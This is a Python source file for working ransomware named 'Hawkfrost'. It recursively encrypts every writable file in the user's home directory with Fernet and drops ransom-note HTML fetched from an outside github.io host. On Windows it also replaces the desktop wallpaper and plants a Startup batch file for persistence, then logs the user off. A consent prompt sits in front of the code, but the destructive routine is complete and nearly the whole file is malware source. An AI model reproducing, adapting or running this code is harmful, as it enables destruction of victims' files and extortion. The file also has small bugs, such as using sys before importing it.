import platform

oS = platform.system()

if(oS != "Windows") and (oS != "Linux"):
    print("Oops, your operating system is not supported! Please run this program on a Windows or Linux device!")
    sys.exit()

import socket

try:
    socket.setdefaulttimeout(3)
    socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
except socket.error as ex:
    print("Oops, you need to be connected to the internet to continue!\nPlease connect to the internet and try again.")
    sys.exit()

import os, json, pathlib, requests, random, time, sys  
from cryptography.fernet import Fernet

testFiles = False
temp = f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Local\\Temp\\"
files = []
globalKey = Fernet.generate_key()
blocked = [os.path.basename(__file__), "config.json", "i.jpg", "key.key", "README.html", "decrypt.html", "desktop.ini"]
readmeData = requests.get("https://eli-sterken.github.io/Garden-Times/hawkfrost/README.html").content

if(oS == "Linux"):
    temp = "/tmp/"    

def checkStat(file):
    for i in blocked:
        if(os.path.basename(f"{file}") == i):
            return False
    return True      

def encrypt():
    print("\n\nPreforming required file operarions. This may take a while.\nDo not close this program or your files will become corrupt.\n\n")
    def getFiles(dir):
        if("AppData" in dir):
            return
        try:
            for item in os.listdir(dir):
                itemFocus = os.path.join(dir, item)
                if(os.path.isdir(itemFocus)):
                    getFiles(itemFocus)
                else:
                    if(os.path.isfile(itemFocus)) and (os.access(itemFocus, os.W_OK)) and (checkStat(itemFocus) == True):
                        files.append(itemFocus)                     
        except:
            return 
    
    if(testFiles == True):
        getFiles(f"{os.path.abspath('./files/')}/")
    elif(oS == "Windows"):
        getFiles(f"C:\\Users\\{os.getenv('USERNAME')}\\") 
    else:
        getFiles(os.path.expanduser("~"))  

    for file in files:
        if(not os.path.exists(f"{pathlib.Path(file).parent}/README.html")):
            with open(f"{pathlib.Path(file).parent}/README.html", "wb") as readmeFile:
                readmeFile.write(readmeData)      
        try:
            os.rename(file, f"{file}.hawkfrost")        
        except:
            None
        try:
            with open(f"{file}.hawkfrost", "rb") as fileRead:
                contents = fileRead.read()
        except:
            continue
        try:        
            with open(f"{file}.hawkfrost", "wb") as fileWrite:
                try:
                    fileWrite.write(Fernet(globalKey).encrypt(contents))
                except:
                    continue
        except:
            continue
    
    with open(f"{temp}config.json", "w") as configFile0:
        configFile0.write(json.dumps({"decryptOnRun":1, "files": files}, indent=4))
    with open(f"{temp}key.key", "wb") as keyFile0:
        keyFile0.write(globalKey)
    with open(f"{pathlib.Path(__file__).parent}/decrypt.html", "wb") as decryptFile:
        decryptFile.write(requests.get("https://eli-sterken.github.io/Garden-Times/hawkfrost/decrypt.html").content)
    if(oS == "Windows"):
        with open(f"{temp}i.jpg", "wb") as bgImage:
            bgImage.write(requests.get("https://eli-sterken.github.io/Garden-Times/hawkfrost/background.jpg").content)    
        os.system(f"powershell Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name Wallpaper -value '{temp}i.jpg' -Force")    
        with open(f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hawkfrost.bat", "w") as startupFile:
            startupFile.write(f'python "{__file__}"')   
        os.system("powershell logoff")
        sys.exit()
    print("\n\nAll your files have been encrypted by the Hawkfrost ransomware!\nSee README.html for more info!")    
    time.sleep(10)
    sys.exit()

def decrypt(mode, key):
    if(key == None):    
        if(mode == "Linux"):
            print("All your files have been encrypted by the Hawkfrost ransomware!\nSee README.html for more info!\n\n")
        print(f"\n\nTo decrypt your files, open the decrypt.html file (located in the same folder as this ransomware,) and enter your personal encryption key listed below:\nYour personal encryption key is: {globalKey}c{random.random()}{random.random()}\n\n")
        keyInput = input("Please enter your decryption key below:\n\n")
        if(keyInput == globalKey):
            decrypt(None, keyInput)
        else:
            print("\n\nIncorrect key, try again!")
            decrypt(None, None)        
    else:
        print("\n\nKey correct, decrypting files! This may take a while, do not close this window!")
        for file in files:
            if(os.path.exists(f"{pathlib.Path(f'{file}.hawkfrost').parent}/README.html")):
                os.remove(f"{pathlib.Path(f'{file}.hawkfrost').parent}/README.html")
            try:
                os.rename(f'{file}.hawkfrost', file)
            except:
                None
            try:
                with open(file, "rb") as fileRead0:
                    contents0 = fileRead0.read()
            except:
                continue
            try:
                with open(file, "wb") as fileWrite0:
                    try:
                        fileWrite0.write(Fernet(key).decrypt(contents0))
                    except:
                        continue
            except:
                continue
        with open(f"{pathlib.Path(__file__).parent}/cleanup.py", "wb") as cleanupFile:
                cleanupFile.write(requests.get("https://eli-sterken.github.io/Garden-Times/hawkfrost/cleanup.py").content)
        
        print("\n\nAll your files have been decrypted sucessfully!\nPlease close this program and run the created cleanup\nfile to remove all traces of the ransomware from your system.") 
        time.sleep(10)
        sys.exit()                                 
                    

if(os.path.exists(f"{temp}config.json")):
    with open(f"{temp}config.json", "r") as configFile:
        configData = json.load(configFile)
    if(configData["decryptOnRun"] == 1):
            files = configData["files"]
            with open(f"{temp}key.key", "rb") as keyFile:
                globalKey = keyFile.read().decode()
            decrypt(oS, None)
else:
    if(1 > 0):
        consent = input("WARNING, THIS PROGRAM IS RANSOMWARE AND WILL MAKE ALL YOUR FILES UNREADIBLE!\nARE YOU SURE YOU WANT TO RUN IT? [Y/N]\n\n").lower()
        if(consent != "y"):
            sys.exit()
    encrypt()